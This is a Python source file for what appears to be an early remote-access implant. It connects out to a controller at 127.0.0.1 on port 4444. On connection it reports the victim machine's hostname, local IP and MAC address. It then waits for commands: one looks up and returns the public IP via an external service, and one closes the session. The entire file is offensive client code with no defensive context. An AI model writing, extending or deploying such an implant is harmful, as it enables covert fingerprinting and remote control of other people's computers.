import platform
import socket
import sys
import urllib.request
import json
import uuid
import struct


IP = "127.0.0.1"
PORT = 4444
ARC = platform.system()

def send(sock, data):
    if isinstance(data, str):
        data = data.encode()
    data_size = len(data)
    sock.sendall(struct.pack('>I', data_size)) 
    sock.sendall(data) 

def recv(sock):
    data_size = recvall(sock, 4)  
    if not data_size:
        return None 
    data_len = struct.unpack(">I", data_size)[0]  
    return recvall(sock, data_len)

def recvall(sock, n):
    packet = b'' 
    while len(packet) < n:
        frame = sock.recv(n - len(packet))  
        if not frame:
            return None  
        packet += frame  
    return packet  


def get_ip_info():
        try:
            lip = str(socket.gethostbyname(socket.gethostname()))
            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            data = json.loads(res.read().decode())
            pip = data.get('ip', 'Unknown')
            output = {
                "pip": pip,
                "lip": lip
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting IP info: {e}".encode()
    
def kill_connection(sock):
        sock.close()
        sys.exit()

def handle_cmd(sock):
    try:
        while True:
            try:
                cmd = recv(sock).decode()
                if not cmd or cmd == None:
                    print("Invalid cmd")
                    
                if cmd == "getip":
                    output = get_ip_info()
                    send(sock, output)

                elif cmd.lower() == "kill":
                    kill_connection(sock)
                    
                else:
                    response = f"Received cmd: {cmd}"
                    print(response)
            except socket.error as e:
                print(f"Error cmd: {e}")
                sock.close()
                sys.exit(0)
                break
                
    except Exception as e:
        print(f"\nCommand handler error: {e}")
        sock.close()
        sys.exit(0)

def gsi():
        try:
            hn = platform.node()
            lip = str(socket.gethostbyname(socket.gethostname()))
            m = uuid.getnode()
            mc = ':'.join(['{:02x}'.format((m >> ele) & 0xff) for ele in range(40, -1, -8)])
            output = {
                "lip": lip,
                "hname": hn,
                "mac": mc
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting info: {e}".encode()
        

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        info = gsi()
        send(sock, info)
        print("Connected to server...")

        handle_cmd(sock)

    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
